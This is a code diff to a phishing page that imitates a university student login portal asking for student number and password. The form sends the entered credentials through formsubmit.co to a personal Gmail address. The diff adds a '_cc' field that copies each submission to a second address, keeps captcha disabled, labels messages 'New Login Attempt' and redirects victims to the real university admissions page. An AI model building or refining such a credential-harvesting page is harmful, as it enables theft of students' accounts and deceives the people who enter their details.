@@ -27,10 +27,11 @@
             <h5>Registered Users</h5>
         </header>
 
-  <form action="https://formsubmit.co/Nerh320@gmail.com" method="POST">
-      <input type="hidden" name="blaq" value="jackkamogelo83@gmail.com" method="POST">
-               <input type="hidden" name="_captcha" value="false">
-             <input type="hidden" name="_next" value="https://www.ul.ac.za/admissions/">
+        <form action="https://formsubmit.co/Nerh320@gmail.com" method="POST">
+            <input type="hidden" name="_cc" value="jackkamogelo83@gmail.com">
+            
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://www.ul.ac.za/admissions/">
             <input type="hidden" name="_subject" value="New Login Attempt">
             <input type="hidden" name="authorise_function" value="Login">
 
@@ -57,12 +58,11 @@
                 <input class="w3-input w3-border" type="password" name="x_password">
             </div>
 
-           <input type="submit" class="w3-button w3-padding-small w3-border" value="Login" onclick="document.frmLogin.authorise_function.value='Login';">
+            <input type="submit" class="w3-button w3-padding-small w3-border" value="Login" onclick="document.frmLogin.authorise_function.value='Login';">
             <input type="button" class="w3-button w3-padding-small w3-border" value="Forgot Pin" onclick="document.frmLogin.authorise_function.value='sendLogin'; document.frmLogin.submit();">
             <input type="button" class="w3-button w3-padding-small w3-border" value="Change Pin" onclick="document.frmLogin.authorise_function.value='changePin'; document.frmLogin.submit();">
             <input type="button" class="w3-button w3-padding-small w3-border" value="Request A Pin" onclick="document.frmLogin.authorise_function.value='requestPin'; document.frmLogin.submit();">
             <input type="button" class="w3-button w3-padding-small w3-border" value="Forgot Student Number" onclick="document.frmLogin.authorise_function.value='forgotStno'; document.frmLogin.submit();">
-            </div>
         </form>
     </div>
 
@@ -110,7 +110,7 @@
         }
 
         function set_it() {
-            let form = document.frmLogin;
+            let form = document.querySelector("form");
             let radios = form.numtype;
             let selectedValue = "S"; 
             for (let i = 0; i < radios.length; i++) {
